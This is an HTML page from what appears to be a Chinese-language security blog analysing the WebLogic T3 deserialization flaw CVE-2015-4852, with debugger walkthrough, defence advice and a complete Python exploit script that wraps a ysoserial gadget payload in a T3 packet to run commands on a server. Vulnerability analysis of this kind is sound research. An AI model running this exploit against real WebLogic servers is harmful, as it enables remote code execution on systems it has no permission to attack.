@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>WebLogic T3反序列化漏洞分析</h1>
+                    <h2 class="subheading">CVE-2015-4852漏洞分析</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on June 28, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+            	
+            	
+
+                <h2 class="section-heading">T3协议</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;Java RMI的基础通信协议是JRMP，而T3协议是WebLogic RMI调用时专用的通信协议，是JRMP的加强版本。</p>
+                
+                <h2 class="section-heading">影响范围</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;10.3.6.0</p>
+                <p>&nbsp;&nbsp;&nbsp;12.1.2.0</p>
+                <p>&nbsp;&nbsp;&nbsp;12.1.3.0</p>
+                <p>&nbsp;&nbsp;&nbsp;12.2.1.0</p>
+                
+
+              	
+              	<h2 class="section-heading">漏洞分析</h2>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;这里断点的逻辑是: Server必定会反序列化Client通过RMI传递过来的数据，所以直接在InboundMsgAbbrev#readObject打断点。</p>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-6-28/1-2.jpg">
+                	<img class="img-fluid" src="../img/2022-6-28/1-2.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;这里的var1中的head即发送过去的反序列化数据。</p>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-6-28/1-3.jpg">
+                	<img class="img-fluid" src="../img/2022-6-28/1-3.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;这里调用getServerChannel方法获取T3协议数据包的信息。</p>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-6-28/1-4.jpg">
+                	<img class="img-fluid" src="../img/2022-6-28/1-4.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;将T3数据包内容传入readObject方法进行进一步解析。</p>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-6-28/1-5.jpg">
+                	<img class="img-fluid" src="../img/2022-6-28/1-5.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;中间会对数据包内容进行分块然后依次调用resolveClass方法进行解析，先调用super.resolveClass(var1)从var1获取到对应的类对象赋值给var2，再把var2返回。
+              		所以resolveClass方法的作用是将类的序列化描述符通过加工成该类的Class对象，后面的补丁也是从这里入手增加一个if判断拦截黑名单。</p>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-6-28/1-6.jpg">
+                	<img class="img-fluid" src="../img/2022-6-28/1-6.jpg" alt="">
+              	</a>
+              	
+              	
+              	
+              	<h2 class="section-heading">EXP构造思路</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;从ateam分析文章得到每个序列化对象(会逐个进行反序列化)都会有相同的二进制(0xfe 0x01 0x00 0x00)以及序列化魔术头(0xac 0xed 0x00 0x05)。
+                	所以我们只需要找aced0005和fe010000部分然后把恶意序列化数据替换进去。最后再修改T3协议头前四个字节的数据包长度字段。</p>
+                
+                <h2 class="section-heading">自动化工具</h2>
+                
+                
+                <div>
+                	
+                	<pre class='hljs'><code>import struct
+import subprocess
+import socket
+import re
+import binascii
+
+
+def <span class="hljs-function"><span class="hljs-title">generatePayload</span><span class="hljs-params">(gadget, cmd)</span></span>:
+    YSO_PATH = <span class="hljs-string">"/java/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>
+    popen = subprocess.<span class="hljs-function"><span class="hljs-title">Popen</span><span class="hljs-params">([<span class="hljs-string">'java'</span>, <span class="hljs-string">'-jar'</span>, YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)</span></span>
+    return popen<span class="hljs-class">.stdout</span><span class="hljs-class">.read</span>()
+
+
+def <span class="hljs-function"><span class="hljs-title">T3Exploit</span><span class="hljs-params">(ip, port, payload)</span></span>:
+    sock = socket.<span class="hljs-function"><span class="hljs-title">socket</span><span class="hljs-params">(socket.AF_INET, socket.SOCK_STREAM)</span></span>
+    sock.<span class="hljs-function"><span class="hljs-title">connect</span><span class="hljs-params">((ip, port)</span></span>)
+    handshake = <span class="hljs-string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>
+    sock.<span class="hljs-function"><span class="hljs-title">sendall</span><span class="hljs-params">(handshake.encode()</span></span>)
+    data = sock.<span class="hljs-function"><span class="hljs-title">recv</span><span class="hljs-params">(<span class="hljs-number">1024</span>)</span></span>
+    compile = re.<span class="hljs-function"><span class="hljs-title">compile</span><span class="hljs-params">(<span class="hljs-string">"HELO:(.*).0.false"</span>)</span></span>
+    match = compile.<span class="hljs-function"><span class="hljs-title">findall</span><span class="hljs-params">(data.decode()</span></span>)
+    <span class="hljs-keyword">if</span> match:
+        <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">"Weblogic: "</span> + <span class="hljs-string">""</span>.join(match)</span></span>)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">"Not Weblogic"</span>)</span></span>
+        return
+    <span class="hljs-tag">header</span> = binascii.<span class="hljs-function"><span class="hljs-title">a2b_hex</span><span class="hljs-params">(b<span class="hljs-string">"00000000"</span>)</span></span>
+    t3header = binascii.a2b_hex(
+        b<span class="hljs-string">"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>)
+    desflag = binascii.<span class="hljs-function"><span class="hljs-title">a2b_hex</span><span class="hljs-params">(b<span class="hljs-string">"fe010000"</span>)</span></span>
+    payload = <span class="hljs-tag">header</span> + t3header + desflag + payload
+    payload = struct.<span class="hljs-function"><span class="hljs-title">pack</span><span class="hljs-params">(<span class="hljs-string">"&gt;I"</span>, len(payload)</span></span>) + payload[<span class="hljs-number">4</span>:]
+    sock.<span class="hljs-function"><span class="hljs-title">send</span><span class="hljs-params">(payload)</span></span>
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    ip = <span class="hljs-string">"127.0.0.1"</span>
+    port = <span class="hljs-number">7001</span>
+    gadget = <span class="hljs-string">"CommonsCollections1"</span>
+    cmd = <span class="hljs-string">"touch /tmp/success"</span>
+    payload = <span class="hljs-function"><span class="hljs-title">generatePayload</span><span class="hljs-params">(gadget, cmd)</span></span>
+    <span class="hljs-function"><span class="hljs-title">T3Exploit</span><span class="hljs-params">(ip, port, payload)</span></span></code></pre>
+                	
+                	</div>
+                	
+             
+             <h2 class="section-heading">防御方案</h2>
+             
+             <p>&nbsp;&nbsp;&nbsp;补丁上在resolveClass方法中使用黑名单的形式不足以防御该漏洞，更好的方法是在服务器外再做一个反向代理，
+             	这样可以只接受http协议的请求，而不接受T3协议的请求。</p>
+             
+             
+             		
+             		
+             		
+             		<h2 class="section-heading">Weblogic漏洞图(2019前)</h2>
+            	
+            	<a data-fancybox="gallery" href="../img/2022-6-28/1-1.jpeg">
+                	<img class="img-fluid" src="../img/2022-6-28/1-1.jpeg" alt="">
+              	</a>
+
+
+
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
